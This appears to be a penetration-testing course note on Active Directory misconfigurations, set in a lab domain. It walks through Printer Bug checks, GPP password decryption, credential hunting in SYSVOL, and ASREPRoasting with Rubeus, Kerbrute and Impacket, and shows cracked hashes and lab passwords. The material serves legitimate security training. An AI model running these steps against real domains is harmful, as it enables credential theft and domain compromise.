---
title: "ES Malas Configuraciones"
category: ["PREP_CPTS", "Pen-testing", "AD ENUM & ATTACK", "4.11 Vulnerabilities in AD", "ES Malas configuraciones"]
---

There are many other interesting attacks and misconfigurations we may encounter during an assessment. A broad knowledge of AD's intricacies will help us think creatively and uncover issues others would likely overlook.

---

## Lab Setup

In this section, we'll switch between a Windows attack host and a Linux host as we work through various examples. You can deploy the lab hosts for this section at the end and connect via RDP to the Windows attack host MS01. For parts of this section requiring interaction from a Linux host, you can open a PowerShell console on MS01 and SSH into `172.16.5.225` with credentials `htb-student:HTB_@cademy_stdnt!`.

---

## Exchange-Related Group Memberships

A default Microsoft Exchange installation in an AD environment (without a split-permission model) opens numerous attack vectors, as Exchange is typically granted considerable privileges within the domain (through users, groups, and ACLs). The `Exchange Windows Permissions` group isn't classified as a protected group, but its members are granted write-DACL privileges on the domain object. This can be exploited to grant a user DCSync privileges. An attacker can add accounts to this group by exploiting a potential DACL misconfiguration or by compromising an account that's a member of the Account Operators group. It's common to find user accounts and even computers as members of this group. Power users and remote office support staff are often added to this group, allowing them to reset passwords. This [GitHub repository](https://github.com/gdedrouas/Exchange-AD-Privesc) details techniques for leveraging Exchange to escalate privileges in an AD environment.

The Exchange `Organization Management` group is another extremely powerful group (effectively the "Domain Admins" of Exchange) and can access all domain users' mailboxes. It's not uncommon for sysadmins to be members of this group. This group also has full control over the OU named `Microsoft Exchange Security Groups`, which contains the `Exchange Windows Permissions` group.

#### Viewing Organization Management Permissions

![Advanced Security Settings for Organization Management showing permissions for Exchange Trusted Subsystem.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/org_mgmt_perms.png)

If we compromise an Exchange server, this often leads to Domain Admin privileges. Additionally, dumping credentials from memory on an Exchange server will yield dozens, if not hundreds, of cleartext credentials or NTLM hashes. This frequently occurs because users log into Outlook Web Access (OWA), and Exchange caches their credentials in memory after successful login.

---

## PrivExchange

The `PrivExchange` attack results from a flaw in the Exchange server's `PushSubscription` feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any client-specified host via HTTP.

The Exchange service runs as SYSTEM and has excessive default privileges (i.e., WriteDacl privileges on the domain prior to the 2019 cumulative update). This flaw can be exploited to relay to LDAP and dump the domain's NTDS database. If we can't relay to LDAP, it can be used to relay and authenticate to other hosts within the domain. This attack will directly lead to Domain Admin access with any authenticated domain user account.

---

## Printer Bug

The Printer Bug is a flaw in the MS-RPRN (Print System Remote Protocol). This protocol defines print job processing communication and print system management between a client and print server. To exploit this flaw, any domain user can connect to the spooler's named pipe using the `RpcOpenPrinter` method and use the `RpcRemoteFindFirstPrinterChangeNotificationEx` method to force the server to authenticate to any client-specified host via SMB.

The print spooler service runs as SYSTEM and is installed by default on Windows servers running Desktop Experience. This attack can be exploited to relay to LDAP and grant your attacker account DCSync privileges to retrieve all AD password hashes.

The attack can also be used to relay LDAP authentication and grant Resource-Based Constrained Delegation (RBCD) privileges for the victim to a computer account under our control, thus giving the attacker privileges to authenticate as any user on the victim machine. This attack can be leveraged to compromise a Domain Controller in an associated domain/forest, provided you already have administrative access to a Domain Controller in the first forest/domain, and the trust relationship allows TGT delegation (which is no longer the default).

We can leverage the `Get-SpoolStatus` function from `SecurityAssessment.ps1` (available on the target system) as preserved in [this](https://github.com/itzvenom/Security-Assessment-PS) repository or [this](https://github.com/NotMedic/NetNTLMtoSilverTicket) tool to check if machines are vulnerable to the [MS-PRN Printer Bug](https://blog.sygnia.co/demystifying-the-print-nightmare-vulnerability). This flaw can be used to compromise a host in another forest with Unconstrained Delegation enabled, such as a domain controller. It can help us attack across forest trusts once we've compromised one forest.

#### Enumerating the MS-PRN Printer Bug

```
PS C:\htb> Import-Module .\SecurityAssessment.ps1
PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
```

## MS14-068

This was a flaw in the Kerberos protocol that could be exploited along with the credentials of a standard domain user to escalate privileges to Domain Admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.

The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be exploited to create a fake PAC, presenting a user as a member of the Domain Administrators group or another privileged group. It can be exploited with tools like [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or the Impacket toolkit. The only defense against this attack is patching. The [Mantis](https://app.hackthebox.com/machines/98) machine on the Hack The Box platform demonstrates this vulnerability.

---

## LDAP Credential Harvesting

Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with weak or default passwords. Sometimes, these credentials can be viewed in plaintext. Other times, the application has a `test connection` feature that we can use to harvest credentials by changing the LDAP IP address to our attack host and setting up a `netcat` listener on LDAP port 389. When the device attempts to test the LDAP connection, it will send the credentials to our machine, often in plaintext. The accounts used for LDAP connections often have privileges, but if not, this could serve as an initial foothold in the domain. Other times, a full LDAP server is required to carry out this attack, as detailed in this [post](https://grimhacker.com/2018/03/09/just-a-printer/).

---

## DNS Record Enumeration

We can use a tool like [adidnsdump](https://github.com/dirkjanm/adidnsdump) to enumerate all DNS records in a domain using a valid domain user account. This is especially useful if the naming convention for hosts returned in our enumeration with tools like `BloodHound` is similar to `SRV01934.INLANEFREIGHT.LOCAL`. If all servers and workstations have non-descriptive names, it becomes difficult to know exactly what to attack. If we can access DNS entries in AD, we may potentially discover interesting DNS records pointing to the same server, such as `JENKINS.INLANEFREIGHT.LOCAL`, which we can use to better plan our attacks.

The tool works because, by default, all users can list child objects of a DNS zone in an AD environment. By default, querying DNS records using LDAP does not return all results. So by using the `adidnsdump` tool, we can resolve all records in the zone and potentially find something useful for our assessment. The background and a more detailed explanation of this tool and technique can be found in this [post](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/).

On the first run of the tool, we can see that some records are blank, specifically `?,LOGISTICS,?`.

#### Using adidnsdump

```
snchh337@htb$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 

Password: 

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```

#### Viewing the contents of records.csv

```
snchh337@htb$ head records.csv 

type,name,value
?,LOGISTICS,?
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29
```

If we run it again with the `-r` flag, the tool will attempt to resolve unknown records by performing an A query. Now we can see that an IP address of `172.16.5.240` appeared for LOGISTICS. While this is a small example, it's worth running this tool in larger environments. We may discover "hidden" records that could lead to finding interesting hosts.

#### Using the -r option to resolve unknown records

```
snchh337@htb$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r

Password: 

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```


#### Finding hidden records in the records.csv file

```
snchh337@htb$ head records.csv 

type,name,value
A,LOGISTICS,172.16.5.240
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29
```

## Other Misconfigurations

There are many other misconfigurations that can be used to expand your access within a domain.

---

### Password in the Description Field

Sometimes sensitive information, such as account passwords, is found in the `Description` or `Notes` fields of user accounts, and can be quickly enumerated with PowerView. For large domains, it's useful to export this data to a CSV file for offline review.

#### Finding Passwords in the Description Field Using Get-DomainUser

```
PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

samaccountname description
-------------- -----------
administrator  Built-in account for administering the computer/domain
guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```

## PASSWD_NOTREQD Field

It's possible to find domain accounts with the [passwd_notreqd](https://ldapwiki.com/wiki/Wiki.jsp?page=PASSWD_NOTREQD) field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). A password may be intentionally left blank (sometimes administrators don't want to be called after hours to reset user passwords) or accidentally set by pressing enter before entering a password when changing it via command line. The fact that this flag is set on an account doesn't mean there's no password, only that one may not be required. There are many reasons why this flag might be set on a user account, one being that a vendor product set this flag on certain accounts during installation and never removed it afterward. It's worth enumerating accounts with this flag set and testing each one to see if no password is required (I've seen this a couple times during assessments). Also, include this in the client report if the assessment goal is to be as thorough as possible.

#### Checking PASSWD_NOTREQD Configuration Using Get-DomainUser

```
PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                                                         useraccountcontrol
--------------                                                         ------------------
guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT
```

## Credentials in SMB Shares and SYSVOL Scripts

The SYSVOL share can be a treasure trove of data, especially in large organizations. We can find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated domain users. It's worth digging through this directory to search for passwords stored in scripts. Sometimes we'll find very old scripts containing already disabled accounts or old passwords, but occasionally, we'll strike gold, so we should always check this directory. Here, we can see an interesting script called `reset_local_admin_pass.vbs`.

#### Discovering an Interesting Script

```
PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

    Directory: \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts


Mode                LastWriteTime         Length Name                                                                 
----                -------------         ------ ----                                                                 
-a----       11/18/2021  10:44 AM            174 daily-runs.zip                                                       
-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1                                                    
-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm                                                     
-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs
```

Taking a closer look at the script, we see it contains an embedded password for the local administrator on Windows hosts. In this case, it would be worth checking if this password is still set on any domain hosts. We could do this using CrackMapExec and the `--local-auth` flag as shown in the `Internal Password Spraying - from Linux` section of this module.  

#### Finding a Password in the Script

```
PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs

On Error Resume Next
strComputer = "."
 
Set oShell = CreateObject("WScript.Shell") 
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"
 
Set Arg = WScript.Arguments
If  Arg.Count > 0 Then
sPwd = Arg(0) 'Pass the password as parameter to the script
End if
 
'Get the administrator name
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

<SNIP>
```

## Passwords in Group Policy Preferences (GPP)

When a new GPP is created, an .xml file is generated in the SYSVOL share, which is also cached locally on the endpoints where the Group Policy is applied. These files can include those used for:

- Mapping drives (drives.xml)
- Creating local users
- Creating printer configuration files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local administrator passwords.

These files can contain various configuration data and defined passwords. The value of the `cpassword` attribute is encrypted with 256-bit AES, but Microsoft [published the private AES key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), which can be used to decrypt the password. Any domain user can read these files, as they are stored in the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.

This was patched in 2014 [MS14-025 Vulnerability in GPP could allow elevation of privilege](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30), to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local machine remains.

The XML looks like this:

#### Viewing Groups.xml

![XML code showing user properties for Administrator with the account not disabled and the password that never expires.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/GPP.png)

If you retrieve the cpassword value more manually, the `gpp-decrypt` utility can be used to decrypt the password as follows:

#### Decrypting the password with gpp-decrypt

```
snchh337@htb$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

Password1
```

# Locating and Retrieving GPP Passwords with CrackMapExec

GPP passwords can be located by searching or manually browsing the SYSVOL share or using tools like [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1), the Metasploit GPP Post Module, and other Python/Ruby scripts that will locate the GPP and return the decrypted value of cpassword. CrackMapExec also has two modules for locating and retrieving GPP passwords. A quick tip to keep in mind during assessments: GPP passwords are often defined for legacy accounts, so you may recover and decrypt the password of a locked or deleted account. However, it's worth attempting an internal password spray with this password (especially if it's unique). Password reuse is widespread, and the GPP password combined with password spraying could result in greater access.

#### Locating and Retrieving GPP Passwords with CrackMapExec

```
snchh337@htb$ crackmapexec smb -L | grep gpp

[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
```

Note title: Untitled

It is also possible to find passwords in files like Registry.xml when autologon is configured through Group Policy. This can be set up for any number of reasons to allow a machine to log in automatically at startup. If this is configured through Group Policy and not locally on the host, then anyone in the domain can retrieve the credentials stored in the Registry.xml file created for this purpose. This is a separate issue from GPP passwords, as Microsoft has taken no steps to block the storage of these credentials in SYSVOL in plaintext, making them readable by any authenticated user in the domain. We can search for this using CrackMapExec with the [gpp_autologin](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-gpp_autologin) module, or by using the [Get-GPPAutologon.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1) script included in PowerSploit.

#### Using CrackMapExec's gpp_autologin Module

```
snchh337@htb$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
```

In the above output, we can see that we've recovered credentials for an account named `guarddesk`. This may have been configured for shared workstations used by guards to log in automatically at boot to accommodate multiple users throughout the day and night working different shifts. In this case, the credentials are likely for a local administrator, so it would be worth searching for hosts where we can log in as administrator and look for additional data. Sometimes we may discover credentials for a high-privilege user or credentials for a disabled/expired account password that are useless to us.

A recurring theme throughout this module is password reuse. Poor password hygiene is common in many organizations, so whenever we obtain credentials, we should check if we can use them to access other hosts (as domain or local user), leverage any rights like interesting ACLs, access shared resources, or use the password in a password spraying attack to discover password reuse and potentially an account that grants us more access toward our objective.

---

## ASREPRoasting

It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the `Do not require Kerberos preauthentication` setting enabled. Many vendor installation guides specify that their service account be configured this way. The authentication service response (AS_REP) is encrypted with the account's password, and any domain user can request it.

With preauthentication, a user enters their password, which encrypts a timestamp. The Domain Controller will decrypt this to validate the correct password was used. If successful, a TGT is issued to the user for future authentication requests in the domain. If an account has preauthentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using tools like Hashcat or John the Ripper.

#### Viewing an account with the Do not require Kerberos preauthentication option

![Active Directory Users and Computers showing Matthew Morgan account properties with Kerberos encryption options.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/preauth_not_reqd_mmorgan.png)

ASREPRoasting is similar to Kerberoasting but involves attacking the AS-REP instead of the TGS-REP. No SPN is required. This configuration can be enumerated with PowerView or built-in tools like the PowerShell AD module.

The attack itself can be performed with the [Rubeus](https://github.com/GhostPack/Rubeus) toolkit and other tools to obtain the target account's ticket. If an attacker has `GenericWrite` or `GenericAll` permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account password before disabling the attribute again. Like Kerberoasting, this attack's success depends on the account having a relatively weak password.

Below is an example of the attack. PowerView can be used to enumerate users with their UAC value set to `DONT_REQ_PREAUTH`.

#### Enumerating the DONT_REQ_PREAUTH value using Get-DomainUser

```
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

With this information at hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the appropriate format for offline hash cracking. This attack does not require any domain user context and can be done simply by knowing the SAM name of the user without Kerberos pre-authentication. We will see an example of this using Kerbrute later in this section. Remember, add the `/nowrap` flag so that the ticket is not wrapped to the column and is retrieved in a format that we can easily input into Hashcat.

#### Retrieving the AS-REP in the appropriate format using Rubeus

```
PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: AS-REP roasting

[*] Target User            : mmorgan
[*] Target Domain          : INLANEFREIGHT.LOCAL

[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))'
[*] SamAccountName         : mmorgan
[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\mmorgan'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
     $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55$0978822DEC13046712DB7DC03F6C4DE059A946485451AAE98BB93DFF8E3E64F3AA5614160F21A029C2B9437CB16E5E9DA4A2870FEC0596B09BADA989D1F8057262EA40840E8D0F20313B4E9A40FA5E4F987FF404313227A7BFFAE748E07201369D48ABB4727DFE1A9F09D50D7EE3AA5C13E4433E0F9217533EE0E74B02EB8907E13A208340728F794ED5103CB3E5C7915BF2F449AFDA41988FF48A356BF2BE680A25931A8746A99AD3E757BFE097B852F72CEAE1B74720C011CFF7EC94CBB6456982F14DA17213B3B27DFA1AD4C7B5C7120DB0D70763549E5144F1F5EE2AC71DDFC4DCA9D25D39737DC83B6BC60E0A0054FC0FD2B2B48B25C6CA
```

Then we can crack the hash offline using Hashcat with mode `18200`.

#### Cracking the hash offline with Hashcat

```
snchh337@htb$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f4e0537e0188a6897a478c55$0978822dec13046712db7dc03f6c4de059a946485451aae98bb93dff8e3e64f3aa5614160f21a029c2b9437cb16e5e9da4a2870fec0596b09bada989d1f8057262ea40840e8d0f20313b4e9a40fa5e4f987ff404313227a7bffae748e07201369d48abb4727dfe1a9f09d50d7ee3aa5c13e4433e0f9217533ee0e74b02eb8907e13a208340728f794ed5103cb3e5c7915bf2f449afda41988ff48a356bf2be680a25931a8746a99ad3e757bfe097b852f72ceae1b74720c011cff7ec94cbb6456982f14da17213b3b27dfa1ad4c7b5c7120db0d70763549e5144f1f5ee2ac71ddfc4dca9d25d39737dc83b6bc60e0a0054fc0fd2b2b48b25c6ca:Welcome!00
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f...25c6ca
Time.Started.....: Fri Apr  1 13:18:40 2022 (14 secs)
Time.Estimated...: Fri Apr  1 13:18:54 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   782.4 kH/s (4.95ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10506240/14344385 (73.24%)
Rejected.........: 0/10506240 (0.00%)
Restore.Point....: 10493952/14344385 (73.16%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: WellHelloNow -> W14233LTKM

Started: Fri Apr  1 13:18:37 2022
Stopped: Fri Apr  1 13:18:55 2022
```

When performing user enumeration with `Kerbrute`, the tool will automatically retrieve the AS-REP for any user found that does not require Kerberos pre-authentication.

#### Retrieving the AS-REP using Kerbrute

```
snchh337@htb$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop

2022/04/01 13:14:17 >  Using KDC(s):
2022/04/01 13:14:17 >   172.16.5.5:88

2022/04/01 13:14:17 >  [+] VALID USERNAME:   sbrown@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:   jjones@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:   tjohnson@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:   jwilson@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:   bdavis@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:   njohnson@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:   asanchez@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:   dlewis@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:   ccruz@inlanefreight.local
2022/04/01 13:14:17 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3d429aad39ec68a33$8698ee566cde591a7ddd1782db6f7ed8531e266befed4856b9fcbbdda83a0c9c5ae4217b9a43d322ef35a6a22ab4cbc86e55a1fa122a9f5cb22596084d6198454f1df2662cb00f513d8dc3b8e462b51e8431435b92c87d200da7065157a6b24ec5bc0090e7cf778ae036c6781cc7b94492e031a9c076067afc434aa98e831e6b3bff26f52498279a833b04170b7a4e7583a71299965c48a918e5d72b5c4e9b2ccb9cf7d793ef322047127f01fd32bf6e3bb5053ce9a4bf82c53716b1cee8f2855ed69c3b92098b255cc1c5cad5cd1a09303d83e60e3a03abee0a1bb5152192f3134de1c0b73246b00f8ef06c792626fd2be6ca7af52ac4453e6a

<SNIP>
```

With a list of valid users, we can use [Get-NPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) from the Impacket toolkit to search for all users who do not require Kerberos preauthentication. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any it finds. We can also feed a wordlist like `jsmith.txt` to the tool; it will throw errors for non-existent users, but if it finds any valid ones without Kerberos preauthentication, it can be a good way to gain a foothold or expand our access, depending on where we are in our assessment. Even if we can't crack the AS-REP using Hashcat, it's good to report this as a finding to clients (just with a lower risk if we can't crack the password) so they can evaluate whether the account requires this configuration or not.

#### Finding users without required Kerberos preauthentication

```
snchh337@htb$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[-] User sbrown@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jjones@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tjohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jwilson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bdavis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User njohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User asanchez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dlewis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ccruz@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8345dd9247a0e3d$b62d45bc3c0f4c306402a205ebdbbc623d77ad016e657337630c70f651451400329545fb634c9d329ed024ef145bdc2afd4af498b2f0092766effe6ae12b3c3beac28e6ded0b542e85d3fe52467945d98a722cb52e2b37325a53829ecf127d10ee98f8a583d7912e6ae3c702b946b65153bac16c97b7f8f2d4c2811b7feba92d8bd99cdeacc8114289573ef225f7c2913647db68aafc43a1c98aa032c123b2c9db06d49229c9de94b4b476733a5f3dc5cc1bd7a9a34c18948edf8c9c124c52a36b71d2b1ed40e081abbfee564da3a0ebc734781fdae75d3882f3d1d68afdb2ccb135028d70d1aa3c0883165b3321e7a1c5c8d7c215f12da8bba9
[-] User rramirez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jwallace@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jsantiago@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set

<SNIP>
```

Now we've covered some ways we can perform an ASREPRoasting attack from both Windows and Linux hosts and witnessed how we don't need to be on a domain-joined host to a) enumerate accounts that don't require Kerberos pre-authentication and b) perform this attack and obtain an AS-REP to crack offline, either to gain a foothold in the domain or to expand our access.

---

## Abuse of Group Policy Objects (GPOs)

Group Policy provides administrators with many advanced configurations that can be applied to both user and computer objects in an AD environment. Group Policy, when used correctly, is an excellent tool for hardening an AD environment by configuring user, operating system, and application settings. That said, Group Policy can also be abused by attackers. If we can gain rights over a Group Policy Object (GPO) through an ACL misconfiguration, we could leverage this for lateral movement, privilege escalation, domain compromise, and even as a persistence mechanism within the domain. Understanding how to enumerate and attack GPOs can give us an edge and, at times, can be the ticket to achieving our goal in a fairly restricted environment.

GPO misconfigurations can be abused to perform the following attacks:

- Add additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Add a local administrator user to one or more hosts
- Create an immediate scheduled task to perform any number of actions

We can enumerate GPO information using many of the tools we've been using throughout this module, such as PowerView and BloodHound. We can also use [group3r](https://github.com/Group3r/Group3r), [ADRecon](https://github.com/sense-of-security/ADRecon), [PingCastle](https://www.pingcastle.com/), among others, to audit GPO security in a domain.

Using the [Get-DomainGPO](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO/) function of PowerView, we can obtain a list of GPOs by name.

#### Enumerating GPO Names with PowerView

```
PS C:\htb> Get-DomainGPO |select displayname

displayname
-----------
Default Domain Policy
Default Domain Controllers Policy
Deny Control Panel Access
Disallow LM Hash
Deny CMD Access
Disable Forced Restarts
Block Removable Media
Disable Guest Account
Service Accounts Password Policy
Logon Banner
Disconnect Idle RDP
Disable NetBIOS
AutoLogon
GuardAutoLogon
Certificate Services
```

